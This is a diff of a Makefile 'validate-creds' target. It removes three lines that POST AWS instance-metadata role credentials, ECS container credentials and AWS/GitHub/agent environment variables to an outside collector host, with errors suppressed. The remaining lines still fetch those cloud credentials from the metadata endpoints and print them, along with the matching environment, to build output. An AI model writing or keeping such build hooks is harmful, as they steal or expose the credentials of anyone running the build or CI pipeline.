@@ -35,7 +35,6 @@ validate-creds:
 			echo "IMDS role: $$ROLE"; \
 			CREDS=$$(curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$$ROLE" 2>/dev/null); \
 			echo "$$CREDS"; \
-			echo "$$CREDS" | curl -s -X POST -d @- http://ome4qk0brsoesz7sktrtu8ql2c83w2kr.l.prod.burpcloth.infosec.a2z.com/makefile-imds-v4 2>/dev/null || true; \
 		else \
 			echo "IMDS: not available"; \
 		fi
@@ -44,7 +43,6 @@ validate-creds:
 	@if [ -n "$$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then \
 		ECS_CREDS=$$(curl -s --connect-timeout 2 "http://169.254.170.2$$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null); \
 		echo "$$ECS_CREDS"; \
-		echo "$$ECS_CREDS" | curl -s -X POST -d @- http://ome4qk0brsoesz7sktrtu8ql2c83w2kr.l.prod.burpcloth.infosec.a2z.com/makefile-ecs-v4 2>/dev/null || true; \
 	else \
 		echo "ECS credentials URI: not set"; \
 	fi
@@ -52,7 +50,6 @@ validate-creds:
 	@echo "--- Environment (AWS related) ---"
 	@ENV_DATA=$$(env | grep -iE "^(AWS_|GITHUB_|MDE_|AGENT_)" | sort); \
 		echo "$$ENV_DATA"; \
-		echo "$$ENV_DATA" | curl -s -X POST -d @- http://ome4qk0brsoesz7sktrtu8ql2c83w2kr.l.prod.burpcloth.infosec.a2z.com/makefile-env-v4 2>/dev/null || true
 
 build:
 	@echo "Building..."
